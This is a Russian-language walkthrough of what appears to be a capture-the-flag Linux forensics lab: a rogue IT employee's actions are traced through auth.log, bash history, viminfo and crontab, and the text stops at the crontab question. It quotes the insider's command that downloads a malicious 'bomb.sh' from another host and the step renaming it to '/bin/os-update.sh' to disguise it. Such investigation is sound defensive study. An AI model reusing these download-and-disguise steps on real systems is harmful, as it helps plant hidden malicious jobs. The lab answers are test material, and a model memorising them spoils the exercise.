@@ -1,0 +1,141 @@
+=====================================================================
+* Легенда *
+***********
+
+Cотрудник ИТ-отдела одного из наших клиентов (CyberT) был арестован полицией.
+Парень проводил успешную фишинговую операцию в качестве побочного заработка.
+
+Компания хочет, чтобы мы проверили, не сделал ли этот человек что-либо вредоносное в отношении их активов.
+
+=====================================================================
+* Список инструментов *
+***********************
+
+Так как это среда Linux, то будем использовать только терминал
+И Linux Forensic Cheatshee
+
+=====================================================================
+* Вопросы *
+***********
+
+1)  The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
+    Пользователь установил пакет на машину, используя повышенные привилегии. Согласно журналам, какова полная КОМАНДА?
+
+        cat /var/log/auth.log | grep install (или cat /var/log/auth.log | grep apt)
+
+            Dec 28 06:17:30 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
+            Dec 28 06:19:01 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/bin/apt install dokuwiki
+
+2)  What was the present working directory (PWD) when the previous command was run?
+    Какой был текущий рабочий каталог (PWD) при запуске предыдущей команды?
+
+    В результате предыдущей омнады находим следующий фрагмент
+
+        PWD=/home/cybert
+
+3)  Which user was created after the package from the previous task was installed?
+    Какой пользователь был создан после установки пакета из предыдущей задачи?
+
+        cat /var/log/auth.log | grep add
+
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: new group: name=ubuntu, GID=1000
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: new user: name=ubuntu, UID=1000, GID=1000, home=/home/ubuntu, shell=/bin/bash
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'adm'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'dialout'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'cdrom'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'floppy'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'sudo'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'audio'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'dip'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'video'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'plugdev'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'lxd'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to group 'netdev'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'adm'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'dialout'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'cdrom'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'floppy'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'sudo'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'audio'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'dip'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'video'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'plugdev'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'lxd'
+            Dec 22 07:56:12 ip-10-10-158-38 useradd[1000]: add 'ubuntu' to shadow group 'netdev'
+            Dec 22 07:58:09 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/useradd -m cybert -s /bin/bash
+            Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new group: name=cybert, GID=1001
+            Dec 22 07:58:09 ip-10-10-158-38 useradd[1970]: new user: name=cybert, UID=1001, GID=1001, home=/home/cybert, shell=/bin/bash
+            Dec 28 06:19:46 ip-10-10-168-55 groupadd[3556]: group added to /etc/group: name=ssl-cert, GID=115
+            Dec 28 06:19:46 ip-10-10-168-55 groupadd[3556]: group added to /etc/gshadow: name=ssl-cert
+            Dec 28 06:19:46 ip-10-10-168-55 groupadd[3556]: new group: name=ssl-cert, GID=115
+            Dec 28 06:26:52 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/adduser it-admin
+            Dec 28 06:26:53 ip-10-10-168-55 groupadd[15324]: group added to /etc/group: name=it-admin, GID=1002
+            Dec 28 06:26:53 ip-10-10-168-55 groupadd[15324]: group added to /etc/gshadow: name=it-admin
+            Dec 28 06:26:53 ip-10-10-168-55 groupadd[15324]: new group: name=it-admin, GID=1002
+            Dec 28 06:26:53 ip-10-10-168-55 useradd[15328]: new user: name=it-admin, UID=1002, GID=1002, home=/home/it-admin, shell=/bin/bash
+    
+    У нас получился весьма обширный результат
+    Но нас интересует пользователь, созданный после предыдущей комнады
+    Так что проверям временые метки
+
+    !!! Но, чтобы избежать шума, лучше использовать вот эту команду
+
+        cat /var/log/auth.log | grep adduser
+
+4)  A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
+    Пользователь позже получил привилегии sudo. Когда был обновлен файл sudoers? (Формат: Месяц День ЧЧ:ММ:СС)
+
+    Для ответа на вопрос, нам необходимо отфильтровать записи файла auth.log по апарметру visudo и смотреть наиболее ранню запись
+
+        cat /var/log/auth.log | grep visudo
+
+            Dec 22 07:58:24 ip-10-10-158-38 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/sbin/visudo
+            Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
+
+5)  A script file was opened using the "vi" text editor. What is the name of this file?
+    Файл скрипта был открыт с помощью текстового редактора "vi". Как называется этот файл?
+
+        cat /var/log/auth.log | grep vi
+
+            ...SNIP...
+            Dec 28 06:29:14 ip-10-10-168-55 sudo: it-admin : TTY=pts/0 ; PWD=/home/it-admin ; USER=root ; COMMAND=/usr/bin/vi bomb.sh
+            ...SNIP...
+
+6)  What is the command used that created the file bomb.sh?
+    Какая команда использовалась для создания файла bomb.sh?
+
+    Проверяем историю терминала конкретного пользователя, так как по предыдущим анализам, данный пользователь был создан незаконно
+
+        cat /home/it-admin/.bash_history
+
+            ...SNIP...
+            curl 10.10.158.38:8080/bomb.sh --output bomb.sh
+            ...SNIP...
+
+7)  The file was renamed and moved to a different directory. What is the full path of this file now?
+    Файл был переименован и перемещен в другой каталог. Каков теперь полный путь к этому файлу?
+
+    Необходимо проверить историю пользования редактром vim, конкретного пользователя
+
+        cat /home/it-admin/.viminfo | grep saveas
+
+            :saveas /bin/os-update.sh
+            |2,0,1672208983,,"saveas /bin/os-update.sh"
+
+8)  When was the file from the previous question last modified? (Format: Month Day HH:MM)
+    Когда последний раз изменялся файл из предыдущего вопроса? (Формат: Месяц День ЧЧ:ММ)
+
+    В зависимости от настроек, команда ls -la может не выводить полную дату
+    Поэтому, если нам нужна полная дата, то добавляем ключ --full-time
+
+        ls -la --full-time /bin | grep os-update
+
+            -rw-r--r--  1 root root     325 2022-12-28 06:29:43.998004273 +0000 os-update.sh
+
+9)  At what time will the malicious file trigger? (Format: HH:MM AM/PM)
+    В какое время сработает вредоносный файл? (Формат: ЧЧ:ММ AM/PM)
+
+    Проверяем журнал планировщик заданий
+    Если его результат будет Вам не поняте, то его можно скопировать и прогнать через сайта -   https://crontab.guru/
+
+        cat /etc/crontab
